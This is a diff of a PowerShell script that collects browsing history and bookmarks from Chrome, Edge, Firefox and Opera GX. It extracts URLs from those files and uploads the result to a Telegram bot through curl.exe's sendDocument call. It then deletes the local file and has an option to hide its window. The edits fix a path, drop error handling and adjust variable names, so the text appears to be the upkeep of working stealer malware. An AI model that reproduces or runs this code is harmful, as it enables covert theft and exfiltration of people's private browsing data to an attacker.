@@ -15,7 +15,6 @@ if($hide -eq 'y'){
     }
 }
 
-
 $Token = "$tg"
 $URL='https://api.telegram.org/bot{0}' -f $Token
 
@@ -29,7 +28,7 @@ $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 $Paths = @{
     'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
     'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
     'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
     'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
     'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
@@ -46,26 +45,19 @@ foreach ($Browser in $Browsers) {
     foreach ($DataValue in $DataValues) {
         $PathKey = "${Browser}_${DataValue}"
         $Path = $Paths[$PathKey]
-        
-        if(Test-Path $Path) {
-            try {
-                $Value = Get-Content -Path $Path -ErrorAction SilentlyContinue | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
 
-                $Value | ForEach-Object {
-                    [PSCustomObject]@{
-                        Browser  = $Browser
-                        DataType = $DataValue
-                        Content = $_
-                    }
-                } | Out-File -FilePath $outpath -Append
-            } catch {
-                # Silently continue if there's an error reading the file
-                continue
+        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
+
+        $Value | ForEach-Object {
+            [PSCustomObject]@{
+                Browser  = $Browser
+                DataType = $DataValue
+                Content = $_
             }
-        }
+        } | Out-File -FilePath $outpath -Append
     }
 }
 
-curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+curl.exe -F chat_id="$ChatID" -F document=@"$outPath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 sleep 2
-Remove-Item -Path $outpath -Force
+Remove-Item -Path $outPath -force
